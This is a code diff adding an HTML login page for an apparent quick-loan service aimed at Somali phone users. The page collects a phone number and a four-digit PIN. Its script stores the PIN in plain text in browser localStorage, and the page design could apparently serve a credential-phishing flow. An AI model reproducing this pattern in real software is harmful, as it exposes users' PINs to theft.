@@ -1,0 +1,91 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enough - Login</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:Arial;background:#f5f5f5;margin:0;padding:0}
+.container{max-width:500px;margin:0 auto;background:white;min-height:100vh;display:flex;flex-direction:column}
+.header{background:linear-gradient(135deg,#84cc16,#65a30d);color:white;text-align:center;padding:40px 20px}
+.header h1{margin:0;font-size:28px;opacity:0.3;font-weight:bold}
+.header p{margin:5px 0 0 0;font-size:14px}
+.main{padding:30px 20px;text-align:center;flex:1}
+h2{font-weight:normal;color:#555;margin-bottom:25px;font-size:24px}
+.phone-box{display:flex;align-items:center;border:2px solid #65a30d;border-radius:12px;padding:14px;margin-bottom:25px;background:white}
+.flag{font-size:22px;margin-right:8px}
+.country{font-weight:bold;margin-right:8px}
+.phone-box input{border:none;outline:none;font-size:16px;width:100%}
+.pin-label{color:#888;margin:20px 0 15px 0;font-size:14px}
+.pin-box{display:flex;justify-content:center;gap:12px;margin-bottom:10px}
+.pin-box input{width:55px;height:55px;text-align:center;font-size:24px;border:2px solid #65a30d;border-radius:10px;outline:none}
+.pin-box input:focus{border-color:#84cc16}
+.forgot{color:#888;font-size:13px;margin-bottom:30px;cursor:pointer}
+.btn{width:100%;padding:16px;background:#ccc;color:white;border:none;border-radius:12px;font-size:16px;font-weight:bold;cursor:not-allowed;transition:0.3s}
+.btn.active{background:linear-gradient(90deg,#84cc16,#65a30d);cursor:pointer}
+.footer{background:linear-gradient(135deg,#84cc16,#65a30d);color:white;text-align:center;padding:35px 20px;margin-top:auto;border-radius:40px 40px 0 0}
+.footer h1{margin:0;font-size:28px;font-weight:bold}
+.footer p{margin:5px 0 0 0;font-size:14px}
+</style></head><body>
+<div class="container">
+<div class="header"><h1>Enough</h1><p>Easy and Quick Loans</p></div>
+
+<div class="main">
+<h2>Gal</h2>
+
+<div class="phone-box">
+<span class="flag">🇸🇴</span>
+<span class="country">+252</span>
+<input type="tel" id="phone" placeholder="61 234 567" maxlength="9" oninput="checkBtn()">
+</div>
+
+<p class="pin-label">Enter your PIN.</p>
+<div class="pin-box">
+<input type="password" maxlength="1" id="p1" oninput="move(1)">
+<input type="password" maxlength="1" id="p2" oninput="move(2)">
+<input type="password" maxlength="1" id="p3" oninput="move(3)">
+<input type="password" maxlength="1" id="p4" oninput="move(4)">
+</div>
+<p class="forgot">Can you be executed?</p>
+
+<button class="btn" id="galBtn" onclick="login()">GAL</button>
+</div>
+
+<div class="footer"><h1>Enough</h1><p>Easy and Quick Loans</p></div>
+</div>
+
+<script>
+function move(i){
+  if(document.getElementById('p'+i).value.length==1 && i<4) 
+    document.getElementById('p'+(i+1)).focus();
+  checkBtn();
+}
+
+function checkBtn(){
+  let pin = document.getElementById('p1').value + document.getElementById('p2').value + document.getElementById('p3').value + document.getElementById('p4').value;
+  let phone = document.getElementById('phone').value;
+  let btn = document.getElementById('galBtn');
+  if(pin.length==4 && phone.length>=8){
+    btn.classList.add('active');
+    btn.disabled = false;
+  } else {
+    btn.classList.remove('active');
+    btn.disabled = true;
+  }
+}
+
+function login(){
+  let phone = '+252' + document.getElementById('phone').value;
+  let pin = document.getElementById('p1').value + document.getElementById('p2').value + document.getElementById('p3').value + document.getElementById('p4').value;
+  localStorage.setItem('loginPhone', phone);
+  localStorage.setItem('loginPIN', pin);
+  window.location='step1.html'; // goes to first step of loan form
+}
+
+// Allow backspace to go back
+for(let i=1;i<=4;i++){
+  document.getElementById('p'+i).onkeydown = function(e){
+    if(e.key=="Backspace" && this.value=="" && i>1) 
+      document.getElementById('p'+(i-1)).focus();
+  }
+}
+</script>
+</body></html>
